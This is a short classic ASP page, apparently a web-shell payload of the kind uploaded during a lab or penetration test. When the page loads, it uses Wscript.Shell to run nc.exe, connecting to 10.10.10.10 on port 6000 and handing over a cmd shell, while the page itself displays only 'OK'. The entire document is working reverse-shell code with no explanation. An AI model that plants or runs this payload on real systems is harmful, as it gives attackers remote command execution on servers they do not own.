 <%
Sub Page_Load
'1st test
    Dim objShell : Set objShell = Server.CreateObject("Wscript.Shell")
    objshell.Run("C:\www\nc.exe 10.10.10.10 6000 -e cmd")
End Sub
%>

<!DOCTYPE html>
<html>
<body>
<% Page_Load %>
<h3>OK</h3>
</body>
</html>
